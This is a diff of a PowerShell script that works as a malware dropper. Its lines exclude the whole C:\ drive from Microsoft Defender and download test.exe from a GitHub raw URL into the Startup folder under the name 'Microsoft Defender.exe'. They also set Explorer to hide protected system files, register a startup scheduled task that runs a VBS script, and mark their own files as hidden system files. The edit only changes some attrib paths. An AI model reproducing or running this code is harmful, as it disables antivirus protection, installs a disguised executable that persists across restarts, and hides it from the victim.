@@ -1,5 +1,4 @@
 Add-MpPreference -ExclusionPath "C:\"
-attrib +s +h "C:\ProgramData\"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/vibha000x7/ViaProxy-3.3.3-Java8/refs/heads/main/test.exe' -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Defender.exe"
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
@@ -19,4 +18,4 @@ $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $vbsScriptPat
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Disable ShowSuperHidden at startup"
 attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUI.vbs"
-attrib +s +h "C:\ProgramData\Microsoft\DisableShowSuperHidden.ps1"
+attrib +s +h "C:\ProgramData\DisableShowSuperHidden.ps1"
